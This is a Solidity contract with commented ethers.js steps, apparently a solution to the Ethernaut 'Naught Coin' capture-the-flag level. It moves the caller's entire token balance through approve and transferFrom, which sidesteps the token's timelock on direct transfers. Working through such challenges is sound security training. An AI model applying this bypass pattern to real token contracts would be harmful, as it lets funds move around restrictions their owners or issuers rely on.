// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract naughtCoin {
    address public constant s_coin = 0x44b8d7b44f7DecE5204ddB076549e73E63C5133c;


    function getCoins() external{
        uint amount = IERC20(s_coin).balanceOf(msg.sender);
        require(IERC20(s_coin).transferFrom(msg.sender,address(this),amount),"Transaction Failed");      
    }
}

//const token = await ethers.getContractAt("IERC20","NaughtCoinAddress")
//approve the contract you created to spend your tokens on your behalf
//await token.approve(contract.address,await token.balanceOf("YOUR_WALLET"))
//call the function to let the contract transfer your funds on your behalf
//await contract.getCoins()